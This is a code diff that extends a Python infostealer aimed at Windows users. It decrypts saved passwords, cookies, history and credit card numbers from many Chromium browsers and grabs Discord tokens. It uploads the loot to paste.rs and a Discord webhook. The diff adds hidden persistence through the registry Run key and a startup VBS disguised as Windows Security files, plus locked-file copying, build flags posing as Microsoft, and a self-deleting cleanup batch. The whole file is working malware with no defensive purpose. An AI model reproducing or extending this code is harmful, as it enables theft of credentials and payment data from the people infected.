@@ -1,4 +1,4 @@
-import os, sys, json, base64, urllib.request, re, ctypes, subprocess, sqlite3, shutil, uuid, platform, threading
+import os, sys, json, base64, urllib.request, re, ctypes, subprocess, sqlite3, shutil, uuid, platform, threading, time, winreg
 from datetime import datetime
 
 if os.name == "nt":
@@ -9,61 +9,201 @@ else:
 
 try:
     import requests
+    HAS_REQUESTS = True
 except ImportError:
-    pass
+    HAS_REQUESTS = False
 
 LOCAL = os.getenv("LOCALAPPDATA", "")
 ROAMING = os.getenv("APPDATA", "")
 TEMP = os.getenv("TEMP", "")
 WEBHOOK = "WEBHOOK_URL"
 
+# flags unused smartscreen bypass maybe idk
+# --windows-disable-console --windows-icon-from-ico=icon.ico 
+# --windows-company-name="Microsoft Corporation" --windows-product-name="Windows Security Update"
+# --windows-file-version=10.0.19041.1 --windows-product-version=10.0.19041.1
+# --windows-file-description="Windows Security Module"
+
 PATHS = {
-    'Discord': ROAMING + '\\discord',
-    'Discord Canary': ROAMING + '\\discordcanary',
-    'Discord PTB': ROAMING + '\\discordptb',
-    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
-    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
-    'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
-    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
-    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    'Discord': os.path.join(ROAMING, 'discord'),
+    'Discord Canary': os.path.join(ROAMING, 'discordcanary'),
+    'Discord PTB': os.path.join(ROAMING, 'discordptb'),
+    'Opera': os.path.join(ROAMING, 'Opera Software', 'Opera Stable'),
+    'Opera GX': os.path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
+    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data', 'Default'),
+    'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data', 'Default'),
+    'Brave': os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
+    'Yandex': os.path.join(LOCAL, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
 }
 
 BROWSERS = {
-    'kometa': LOCAL + '\\Kometa\\User Data',
-    'orbitum': LOCAL + '\\Orbitum\\User Data',
-    'cent-browser': LOCAL + '\\CentBrowser\\User Data',
-    '7star': LOCAL + '\\7Star\\7Star\\User Data',
-    'sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
-    'vivaldi': LOCAL + '\\Vivaldi\\User Data',
-    'google-chrome-sxs': LOCAL + '\\Google\\Chrome SxS\\User Data',
-    'google-chrome': LOCAL + '\\Google\\Chrome\\User Data',
-    'epic-privacy-browser': LOCAL + '\\Epic Privacy Browser\\User Data',
-    'microsoft-edge': LOCAL + '\\Microsoft\\Edge\\User Data',
-    'uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
-    'yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
-    'brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
-    'iridium': LOCAL + '\\Iridium\\User Data',
-    'opera': ROAMING + '\\Opera Software\\Opera Stable',
-    'opera-gx': ROAMING + '\\Opera Software\\Opera GX Stable',
-    'coc-coc': LOCAL + '\\CocCoc\\Browser\\User Data'
+    'kometa': os.path.join(LOCAL, 'Kometa', 'User Data'),
+    'orbitum': os.path.join(LOCAL, 'Orbitum', 'User Data'),
+    'cent-browser': os.path.join(LOCAL, 'CentBrowser', 'User Data'),
+    '7star': os.path.join(LOCAL, '7Star', '7Star', 'User Data'),
+    'sputnik': os.path.join(LOCAL, 'Sputnik', 'Sputnik', 'User Data'),
+    'vivaldi': os.path.join(LOCAL, 'Vivaldi', 'User Data'),
+    'google-chrome-sxs': os.path.join(LOCAL, 'Google', 'Chrome SxS', 'User Data'),
+    'google-chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
+    'epic-privacy-browser': os.path.join(LOCAL, 'Epic Privacy Browser', 'User Data'),
+    'microsoft-edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
+    'uran': os.path.join(LOCAL, 'uCozMedia', 'Uran', 'User Data'),
+    'yandex': os.path.join(LOCAL, 'Yandex', 'YandexBrowser', 'User Data'),
+    'brave': os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data'),
+    'iridium': os.path.join(LOCAL, 'Iridium', 'User Data'),
+    'opera': os.path.join(ROAMING, 'Opera Software', 'Opera Stable'),
+    'opera-gx': os.path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
+    'coc-coc': os.path.join(LOCAL, 'CocCoc', 'Browser', 'User Data')
 }
 
 PROFILES = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
 
+# persistance config hopefully will add prompt for this in builder soon
+PERSIST_NAME = "SecurityHealthStartup"
+PERSIST_DIR = os.path.join(LOCAL, "Microsoft", "Windows", "Security")
+PERSIST_PATH = os.path.join(PERSIST_DIR, "SecurityHealthHost.exe")
+
+class DebugLog:
+    def __init__(self, enabled=True):
+        self.enabled = enabled
+        self.path = os.path.join(TEMP, "discordsystemhelper_debug.log")
+        if enabled:
+            self.log("=== SESSION START ===")
+            self.log(f"frozen={getattr(sys, 'frozen', False)} compiled={getattr(sys, '__compiled__', None)}")
+            self.log(f"executable={sys.executable}")
+            try:
+                sz = os.path.getsize(sys.executable)
+                self.log(f"exe_size={sz} bytes")
+            except Exception as e:
+                self.log(f"exe_size_error={e}")
+            self.log(f"local={LOCAL} roaming={ROAMING} temp={TEMP}")
+
+    def log(self, msg):
+        if not self.enabled:
+            return
+        try:
+            with open(self.path, 'a', encoding='utf-8', errors='ignore') as f:
+                f.write(f"{datetime.now().isoformat()} | {msg}\n")
+        except:
+            pass
+
+debug = DebugLog(enabled=True)
+
+def is_frozen():
+    # check if compiled
+    if getattr(sys, 'frozen', False):
+        debug.log("is_frozen=True via sys.frozen")
+        return True
+    # check if compiled but cooler cuz apparently last one only works for pyinstaller
+    try:
+        __compiled__
+        debug.log("is_frozen=True via __compiled__")
+        return True
+    except NameError:
+        pass
+    # Universal fallback: if sys.executable is not the Python interpreter, we're compiled
+    exe = os.path.basename(sys.executable).lower()
+    if exe not in ('python.exe', 'pythonw.exe', 'python'):
+        debug.log(f"is_frozen=True via exe_name={exe}")
+        return True
+    debug.log(f"is_frozen=False, exe={exe}")
+    return False
+
+def check_internet():
+    # dont put all ur dihs in one basket
+    endpoints = [
+        ("https://www.msftconnecttest.com/connecttest.txt", 5),
+        ("https://1.1.1.1", 5),
+        ("https://www.google.com/generate_204", 5),
+        ("https://cloudflare.com", 5),
+        ("https://api.ipify.org?format=json", 10)
+    ]
+    for url, timeout in endpoints:
+        try:
+            req = urllib.request.Request(url, method='HEAD')
+            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+            urllib.request.urlopen(req, timeout=timeout)
+            return True
+        except urllib.error.HTTPError:
+            return True
+        except:
+            continue
+    return False
+
+def wait_for_internet():
+    if check_internet():
+        debug.log("internet_ok")
+        return
+    debug.log("internet_down, waiting 30s")
+    time.sleep(30)
+    if check_internet():
+        debug.log("internet_ok_after_30s")
+        return
+    debug.log("internet_down, waiting 2m")
+    time.sleep(120)
+    if check_internet():
+        debug.log("internet_ok_after_2m")
+        return
+    while True:
+        debug.log("internet_down, waiting 5m")
+        time.sleep(300)
+        if check_internet():
+            debug.log("internet_ok_after_5m")
+            return
+
+def is_persisted():
+    try:
+        if not os.path.exists(PERSIST_PATH):
+            return False
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
+        value, _ = winreg.QueryValueEx(key, PERSIST_NAME)
+        winreg.CloseKey(key)
+        return PERSIST_PATH in value
+    except:
+        return False
+
+def ensure_persistence():
+    if not is_frozen():
+        debug.log("persistence_skip: not frozen")
+        return
+    if is_persisted():
+        debug.log("persistence_already_active")
+        return
+    try:
+        os.makedirs(PERSIST_DIR, exist_ok=True)
+        if not os.path.exists(PERSIST_PATH) or os.path.getsize(PERSIST_PATH) != os.path.getsize(sys.executable):
+            shutil.copy2(sys.executable, PERSIST_PATH)
+            debug.log(f"persistence_copied to {PERSIST_PATH}")
+        ctypes.windll.kernel32.SetFileAttributesW(PERSIST_PATH, 2)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, PERSIST_NAME, 0, winreg.REG_SZ, f'"{PERSIST_PATH}"')
+        winreg.CloseKey(key)
+        debug.log("persistence_registry_set")
+        startup_dir = os.path.join(ROAMING, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        os.makedirs(startup_dir, exist_ok=True)
+        vbs_path = os.path.join(startup_dir, "SecurityHealthHelper.vbs")
+        vbs_content = 'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run "' + PERSIST_PATH + '", 0, False\nSet WshShell = Nothing\n'
+        with open(vbs_path, 'w') as f:
+            f.write(vbs_content)
+        ctypes.windll.kernel32.SetFileAttributesW(vbs_path, 2)
+        debug.log("persistence_startup_vbs_set")
+    except Exception as e:
+        debug.log(f"persistence_error: {e}")
 
 def rc(cmd):
     try:
         return subprocess.run(cmd, capture_output=True, text=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip()
-    except:
+    except Exception as e:
+        debug.log(f"rc_error: {e}")
         return "unknown"
 
 def gk(path):
     try:
-        with open(path + "\\Local State", "r", encoding='utf-8', errors='ignore') as f:
+        with open(os.path.join(path, "Local State"), "r", encoding='utf-8', errors='ignore') as f:
             k = json.load(f)['os_crypt']['encrypted_key']
         return win32crypt.CryptUnprotectData(base64.b64decode(k)[5:], None, None, None, 0)[1]
-    except:
+    except Exception as e:
+        debug.log(f"gk_error [{path}]: {e}")
         return None
 
 def dc(buff, key):
@@ -76,13 +216,15 @@ def dc(buff, key):
             cipher = AES.new(key, AES.MODE_GCM, nonce=buff[3:15])
             return cipher.decrypt(buff[15:-16]).decode('utf-8', errors='ignore')
         return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
-    except Exception:
+    except Exception as e:
+        debug.log(f"dc_error: {e}")
         return ""
 
 def ip():
     try:
         return json.loads(urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5).read().decode()).get("ip", "unknown")
-    except:
+    except Exception as e:
+        debug.log(f"ip_error: {e}")
         return "unknown"
 
 def sanitize_paste(text):
@@ -90,37 +232,96 @@ def sanitize_paste(text):
     for c in text:
         o = ord(c)
         if o < 32 and c not in '\t\n\r':
-            result.append('�')
+            result.append('?')
         elif 127 <= o <= 159:
-            result.append('�')
+            result.append('?')
         else:
             result.append(c)
     return ''.join(result)
 
 def upload_paste(content):
+    if not content or not content.strip():
+        return None
+    clean = sanitize_paste(content)
     try:
-        clean = sanitize_paste(content)
-        resp = requests.post(
-            'https://paste.rs/',
-            data=clean.encode('utf-8'),
-            headers={'Content-Type': 'text/plain; charset=utf-8'},
-            timeout=60
-        )
-        if resp.status_code == 201:
-            return resp.text.strip()
-        return None
-    except:
-        return None
+        if HAS_REQUESTS:
+            resp = requests.post(
+                'https://paste.rs/',
+                data=clean.encode('utf-8'),
+                headers={'Content-Type': 'text/plain; charset=utf-8'},
+                timeout=60
+            )
+            if resp.status_code == 201:
+                debug.log("upload_ok paste.rs")
+                return resp.text.strip()
+            else:
+                debug.log(f"upload_fail status={resp.status_code}")
+        else:
+            req = urllib.request.Request(
+                'https://paste.rs/',
+                data=clean.encode('utf-8'),
+                headers={'Content-Type': 'text/plain; charset=utf-8'},
+                method='POST'
+            )
+            resp = urllib.request.urlopen(req, timeout=60)
+            if resp.status == 201:
+                debug.log("upload_ok paste.rs (urllib)")
+                return resp.read().decode().strip()
+            else:
+                debug.log(f"upload_fail status={resp.status}")
+    except Exception as e:
+        debug.log(f"upload_exception: {e}")
+    return None
+
+def copy_locked_file(src, dst):
+    GENERIC_READ = 0x80000000
+    GENERIC_WRITE = 0x40000000
+    FILE_SHARE_READ = 0x00000001
+    FILE_SHARE_WRITE = 0x00000002
+    OPEN_EXISTING = 3
+    CREATE_ALWAYS = 2
+    FILE_ATTRIBUTE_NORMAL = 0x80
+    INVALID_HANDLE_VALUE = -1
+    h_src = ctypes.windll.kernel32.CreateFileW(
+        src, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+        None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None
+    )
+    if h_src == INVALID_HANDLE_VALUE:
+        debug.log(f"copy_locked CreateFileW failed src={src} err={ctypes.GetLastError()}")
+        return False
+    h_dst = ctypes.windll.kernel32.CreateFileW(
+        dst, GENERIC_WRITE, 0, None, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, None
+    )
+    if h_dst == INVALID_HANDLE_VALUE:
+        ctypes.windll.kernel32.CloseHandle(h_src)
+        debug.log(f"copy_locked CreateFileW failed dst={dst}")
+        return False
+    buf = ctypes.create_string_buffer(65536)
+    read = ctypes.c_uint32(0)
+    written = ctypes.c_uint32(0)
+    total = 0
+    while True:
+        ret = ctypes.windll.kernel32.ReadFile(h_src, buf, 65536, ctypes.byref(read), None)
+        if not ret or read.value == 0:
+            break
+        ctypes.windll.kernel32.WriteFile(h_dst, buf, read.value, ctypes.byref(written), None)
+        total += written.value
+    ctypes.windll.kernel32.CloseHandle(h_src)
+    ctypes.windll.kernel32.CloseHandle(h_dst)
+    debug.log(f"copy_locked success {src} -> {dst} ({total} bytes)")
+    return True
 
 def copy_db(src, dst):
     try:
-        shutil.copy2(src, dst)
+        if not copy_locked_file(src, dst):
+            return False
         for ext in ['-wal', '-shm']:
             wal = src + ext
             if os.path.exists(wal):
-                shutil.copy2(wal, dst + ext)
+                copy_locked_file(wal, dst + ext)
         return True
-    except:
+    except Exception as e:
+        debug.log(f"copy_db_exception: {e}")
         return False
 
 def rm_temp(path):
@@ -129,12 +330,13 @@ def rm_temp(path):
         if os.path.exists(fp):
             try:
                 os.remove(fp)
-            except:
-                pass
+            except Exception as e:
+                debug.log(f"rm_temp_error {fp}: {e}")
 
 def sysinfo():
     try:
-        ram = str(round(int(rc('wmic computersystem get totalphysicalmemory /value').replace('TotalPhysicalMemory=', '').strip()) / (1024**3), 2)) + " GB"
+        ram_raw = rc('wmic computersystem get totalphysicalmemory /value').replace('TotalPhysicalMemory=', '').strip()
+        ram = str(round(int(ram_raw) / (1024**3), 2)) + " GB"
     except:
         ram = "unknown"
     try:
@@ -153,7 +355,7 @@ def sysinfo():
                             wif[p] = ln2.split(':')[1].strip() if ':' in ln2 else ''
     except:
         pass
-    av = rc('powershell -Command "Get-WmiObject -Namespace \'Root\\SecurityCenter2\' -Class AntivirusProduct | Select-Object displayName"')
+    av = rc('powershell -Command "Get-WmiObject -Namespace ''Root\\SecurityCenter2'' -Class AntivirusProduct | Select-Object displayName"')
     lines = [l.strip() for l in av.split('\n') if l.strip() and 'displayName' not in l and '---' not in l]
     av = ', '.join(lines) if lines else "Windows Defender / None"
     mac = ""
@@ -168,8 +370,8 @@ def sysinfo():
     return {
         "username": os.getenv("USERNAME", "unknown"),
         "hostname": os.getenv("COMPUTERNAME", "unknown"),
-        "hwid": hwid if hwid else str(uuid.uuid4()),
-        "uuid": hwid if hwid else str(uuid.uuid4()),
+        "hwid": hwid if hwid else str("idk lol"),
+        "uuid": hwid if hwid else str("idk lol"),
         "mac": mac,
         "ip": ip(),
         "cpu": rc('wmic cpu get name /value').replace('Name=', '').strip(),
@@ -184,39 +386,50 @@ def sysinfo():
     }
 
 def get_tokens(path):
-    tks, ldb_path = [], path + "\\Local Storage\\leveldb\\"
+    tks = []
+    ldb_path = os.path.join(path, "Local Storage", "leveldb")
     if not os.path.exists(ldb_path):
         return tks
     for fl in os.listdir(ldb_path):
         if not fl.endswith((".ldb", ".log")):
             continue
         try:
-            with open(f"{ldb_path}{fl}", "r", errors="ignore") as f:
-                for m in re.findall(r"dQw4w9WgXcQ:[^\"\\s]*", f.read()):
+            fp = os.path.join(ldb_path, fl)
+            with open(fp, "r", errors="ignore") as f:
+                text = f.read()
+                for m in re.findall(r"dQw4w9WgXcQ:[^\"\\s]*", text):
                     tks.append(m)
-        except:
+                for m in re.findall(r"dQw4w9WgXcQ:[^'\\s]*", text):
+                    tks.append(m)
+        except Exception as e:
+            debug.log(f"get_tokens_error {fl}: {e}")
             continue
     return tks
 
 def cleanup():
     try:
-        if hasattr(sys, 'frozen'):
-            exe_path = sys.executable
-            bat_path = os.path.join(TEMP, 'c.bat')
-            with open(bat_path, 'w') as f:
-                f.write(f'@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q "{exe_path}"\ndel /f /q "%~f0"')
-            subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    except:
-        pass
-
+        if not is_frozen():
+            return
+        exe_path = sys.executable
+        if os.path.normcase(exe_path) == os.path.normcase(PERSIST_PATH):
+            debug.log("cleanup_skip: running from persistent path")
+            return
+        bat_name = f'c_{uuid.uuid4().hex[:6]}.bat'
+        bat_path = os.path.join(TEMP, bat_name)
+        bat_content = '@echo off\nping -n 5 127.0.0.1 >nul\n:retry\ndel /f /q "' + exe_path + '" >nul 2>&1\nif exist "' + exe_path + '" goto retry\ndel /f /q "%~f0"\n'
+        with open(bat_path, 'w') as f:
+            f.write(bat_content)
+        subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        debug.log(f"cleanup_bat dropped: {bat_path}")
+    except Exception as e:
+        debug.log(f"cleanup_error: {e}")
 
 class BrowserExtractor:
     def __init__(self):
         self.browsers = BROWSERS
         self.profiles = PROFILES
-        self.out_dir = os.path.join(TEMP, "Browser_" + uuid.uuid4().hex[:8])
+        self.out_dir = os.path.join(TEMP, "discordsystemhelper_" + uuid.uuid4().hex[:8])
         os.makedirs(self.out_dir, exist_ok=True)
-        self.masterkey = None
         self.data = {}
 
     def get_master_key(self, path: str) -> bytes:
@@ -228,7 +441,8 @@ class BrowserExtractor:
             master_key = master_key[5:]
             master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
             return master_key
-        except Exception:
+        except Exception as e:
+            debug.log(f"get_master_key_error [{path}]: {e}")
             return None
 
     def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
@@ -244,7 +458,8 @@ class BrowserExtractor:
                 decrypted = cipher.decrypt(payload)
                 return decrypted[:-16].decode('utf-8', errors='ignore')
             return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
-        except Exception:
+        except Exception as e:
+            debug.log(f"decrypt_val_error: {e}")
             return ""
 
     def _create_temp_copy(self, src: str) -> str:
@@ -257,7 +472,7 @@ class BrowserExtractor:
         if name not in self.data:
             self.data[name] = {"passwords": "", "cookies": "", "history": "", "credit_cards": ""}
 
-    def passwords(self, name: str, path: str, profile: str):
+    def passwords(self, name: str, path: str, profile: str, masterkey: bytes):
         try:
             if name in ['opera', 'opera-gx']:
                 login_path = os.path.join(path, 'Login Data')
@@ -265,26 +480,31 @@ class BrowserExtractor:
                 login_path = os.path.join(path, profile, 'Login Data')
             if not os.path.isfile(login_path):
                 return
+            debug.log(f"passwords_start {name}/{profile}")
             tdb = self._create_temp_copy(login_path)
             if not tdb:
+                debug.log(f"passwords_copy_fail {name}/{profile}")
                 return
             conn = sqlite3.connect(tdb)
             cursor = conn.cursor()
             cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
             self._ensure_browser(name)
+            count = 0
             for row in cursor.fetchall():
                 url, username, encrypted_pass = row
                 if url and username and encrypted_pass:
-                    password = self.decrypt_val(encrypted_pass, self.masterkey)
+                    password = self.decrypt_val(encrypted_pass, masterkey)
                     if password:
                         self.data[name]["passwords"] += f"[{name}/{profile}] {url} | {username}:{password}\n"
+                        count += 1
             cursor.close()
             conn.close()
             rm_temp(tdb)
-        except Exception:
-            pass
+            debug.log(f"passwords_done {name}/{profile} count={count}")
+        except Exception as e:
+            debug.log(f"passwords_exception {name}/{profile}: {e}")
 
-    def cookies(self, name: str, path: str, profile: str):
+    def cookies(self, name: str, path: str, profile: str, masterkey: bytes):
         try:
             if name in ['opera', 'opera-gx']:
                 cookie_path = os.path.join(path, 'Network', 'Cookies')
@@ -292,25 +512,30 @@ class BrowserExtractor:
                 cookie_path = os.path.join(path, profile, 'Network', 'Cookies')
             if not os.path.isfile(cookie_path):
                 return
+            debug.log(f"cookies_start {name}/{profile}")
             tdb = self._create_temp_copy(cookie_path)
             if not tdb:
+                debug.log(f"cookies_copy_fail {name}/{profile}")
                 return
             conn = sqlite3.connect(tdb)
             cursor = conn.cursor()
             cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
             self._ensure_browser(name)
+            count = 0
             for row in cursor.fetchall():
                 host, cname, cpath, encrypted_value, expires = row
-                value = self.decrypt_val(encrypted_value, self.masterkey)
+                value = self.decrypt_val(encrypted_value, masterkey)
                 if host and cname and value:
                     self.data[name]["cookies"] += f"{host}\t{'FALSE' if expires == 0 else 'TRUE'}\t{cpath}\t{'FALSE' if host.startswith('.') else 'TRUE'}\t{expires}\t{cname}\t{value}\n"
+                    count += 1
             cursor.close()
             conn.close()
             rm_temp(tdb)
-        except Exception:
-            pass
+            debug.log(f"cookies_done {name}/{profile} count={count}")
+        except Exception as e:
+            debug.log(f"cookies_exception {name}/{profile}: {e}")
 
-    def history(self, name: str, path: str, profile: str):
+    def history(self, name: str, path: str, profile: str, masterkey: bytes):
         try:
             if name in ['opera', 'opera-gx']:
                 hist_path = os.path.join(path, 'History')
@@ -318,24 +543,29 @@ class BrowserExtractor:
                 hist_path = os.path.join(path, profile, 'History')
             if not os.path.isfile(hist_path):
                 return
+            debug.log(f"history_start {name}/{profile}")
             tdb = self._create_temp_copy(hist_path)
             if not tdb:
+                debug.log(f"history_copy_fail {name}/{profile}")
                 return
             conn = sqlite3.connect(tdb)
             cursor = conn.cursor()
             cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
             self._ensure_browser(name)
+            count = 0
             for row in cursor.fetchall():
                 url, title, visits, last_visit = row
                 if url:
                     self.data[name]["history"] += f"[{name}/{profile}] {title} | {url} (Visits: {visits})\n"
+                    count += 1
             cursor.close()
             conn.close()
             rm_temp(tdb)
-        except Exception:
-            pass
+            debug.log(f"history_done {name}/{profile} count={count}")
+        except Exception as e:
+            debug.log(f"history_exception {name}/{profile}: {e}")
 
-    def credit_cards(self, name: str, path: str, profile: str):
+    def credit_cards(self, name: str, path: str, profile: str, masterkey: bytes):
         try:
             if name in ['opera', 'opera-gx']:
                 webdata_path = os.path.join(path, 'Web Data')
@@ -343,63 +573,75 @@ class BrowserExtractor:
                 webdata_path = os.path.join(path, profile, 'Web Data')
             if not os.path.isfile(webdata_path):
                 return
+            debug.log(f"cc_start {name}/{profile}")
             tdb = self._create_temp_copy(webdata_path)
             if not tdb:
+                debug.log(f"cc_copy_fail {name}/{profile}")
                 return
             conn = sqlite3.connect(tdb)
             cursor = conn.cursor()
             cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
             self._ensure_browser(name)
+            count = 0
             for row in cursor.fetchall():
                 name_on_card, exp_month, exp_year, encrypted_num = row
                 if encrypted_num:
-                    card_num = self.decrypt_val(encrypted_num, self.masterkey)
+                    card_num = self.decrypt_val(encrypted_num, masterkey)
                     if card_num:
                         self.data[name]["credit_cards"] += f"[{name}/{profile}] {name_on_card} | {exp_month}/{exp_year} | {card_num}\n"
+                        count += 1
             cursor.close()
             conn.close()
             rm_temp(tdb)
-        except Exception:
-            pass
+            debug.log(f"cc_done {name}/{profile} count={count}")
+        except Exception as e:
+            debug.log(f"cc_exception {name}/{profile}: {e}")
 
     def extract(self):
-        def run_func(name, path, profile, func):
+        def run_func(name, path, profile, func, masterkey):
             try:
-                func(name, path, profile)
-            except Exception:
-                pass
+                func(name, path, profile, masterkey)
+            except Exception as e:
+                debug.log(f"thread_exception [{name}/{profile}/{func.__name__}]: {e}")
 
         for name, path in self.browsers.items():
             if not os.path.isdir(path):
+                debug.log(f"browser_skip_dir_missing {name}")
                 continue
             local_state = os.path.join(path, 'Local State')
             if not os.path.isfile(local_state):
+                debug.log(f"browser_skip_no_localstate {name}")
                 continue
-            self.masterkey = self.get_master_key(local_state)
-            if not self.masterkey:
+            masterkey = self.get_master_key(local_state)
+            if not masterkey:
+                debug.log(f"browser_skip_bad_key {name}")
                 continue
+            debug.log(f"browser_key_ok {name}")
 
-            funcs = [self.passwords, self.cookies, self.history, self.credit_cards]
+            self._ensure_browser(name)
             threads = []
             for profile in self.profiles:
                 profile_path = path if name in ['opera', 'opera-gx'] else os.path.join(path, profile)
                 if not os.path.isdir(profile_path):
                     continue
-                for func in funcs:
-                    t = threading.Thread(target=run_func, args=(name, path, profile, func))
+                debug.log(f"thread_spawn {name}/{profile}")
+                for func in [self.passwords, self.cookies, self.history, self.credit_cards]:
+                    t = threading.Thread(target=run_func, args=(name, path, profile, func, masterkey))
                     t.start()
                     threads.append(t)
 
             for t in threads:
                 t.join()
+            debug.log(f"browser_threads_joined {name}")
 
         return self.data
 
-
 def main():
+    debug.log("main() started")
+    ensure_persistence()
+    wait_for_internet()
     checked, results = [], {"system": sysinfo(), "discord": [], "browser_data": {}}
     hostname = os.getenv("COMPUTERNAME", "UNKNOWN_PC")
-    
     for plat, path in PATHS.items():
         if not os.path.exists(path):
             continue
@@ -430,12 +672,14 @@ def main():
                     "mfa": user.get("mfa_enabled", False),
                     "nitro": user.get("premium_type", 0)
                 })
-            except:
+                debug.log(f"discord_token_ok {user.get('username','?')}")
+            except Exception as e:
+                debug.log(f"discord_token_fail: {e}")
                 continue
-    
+    debug.log(f"discord_total={len(results['discord'])}")
     extractor = BrowserExtractor()
     raw_data = extractor.extract()
-    
+    total_links = 0
     for browser, categories in raw_data.items():
         results["browser_data"][browser] = {}
         for category, content in categories.items():
@@ -443,18 +687,25 @@ def main():
                 link = upload_paste(content)
                 if link:
                     results["browser_data"][browser][category] = link
-    
+                    total_links += 1
+                    debug.log(f"upload_ok {browser}/{category}")
+                else:
+                    debug.log(f"upload_fail {browser}/{category} len={len(content)}")
+            else:
+                debug.log(f"upload_empty {browser}/{category}")
+    debug.log(f"browser_total_links={total_links}")
     msg = f"{hostname} - {ip()} @everyone\n```json\n{json.dumps(results, indent=2)}\n```"
     try:
         urllib.request.urlopen(urllib.request.Request(WEBHOOK, data=json.dumps({"content": msg}).encode(), headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, method='POST'), timeout=10)
-    except:
-        pass
-    
+        debug.log("webhook_ok")
+    except Exception as e:
+        debug.log(f"webhook_fail: {e}")
     try:
         ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 2)
     except:
         pass
     cleanup()
+    debug.log("main() finished")
 
 if __name__ == "__main__":
     main()
